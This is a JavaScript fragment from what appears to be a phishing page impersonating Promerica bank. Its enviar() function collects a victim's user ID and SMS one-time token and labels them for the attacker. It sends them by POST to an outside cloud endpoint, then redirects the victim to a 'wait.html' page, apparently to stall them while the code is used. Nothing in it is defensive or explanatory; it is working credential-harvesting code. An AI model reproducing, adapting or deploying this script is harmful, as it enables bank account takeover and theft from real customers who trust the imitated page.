<script>
async function enviar() {
	


	event.preventDefault(); // Evita recargar la p√°gina
			const usr = localStorage.getItem("userId");
            const usrs = document.getElementById('tok').value;
            
           
          
			
           

            const message = `‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ[ üè¶Promerica ]‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ \n üë§ Usuario: <code>${usr}</code> --\n üìü TOKENSMS:<code> ${usrs} </code>--` ;
            const responseMessage = document.getElementById("responseMessage");

            if (!message.trim()) {
                responseMessage.textContent = "‚ö†Ô∏è Ingresa un mensaje antes de enviar.";
                return;
            }
{}
            try {
                const response = await fetch("https://116cb782-9f93-4a72-ba4a-d06101f4024e.us-east-1.cloud.genez.io/", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ message })
                });

                const data = await response.json();

                if (response.ok) {
                   localStorage.setItem("usr", usr);
				
				  window.location = "wait.html"
				   
                    
                } else {
                    responseMessage.textContent = "‚ùå Error al enviar mensaje: " + data.error;
                }
            } catch (error) {
                responseMessage.textContent = "‚ùå Error en la solicitud: " + error.message;
            }
}

const userId = localStorage.getItem("userId");
if (userId) {

}
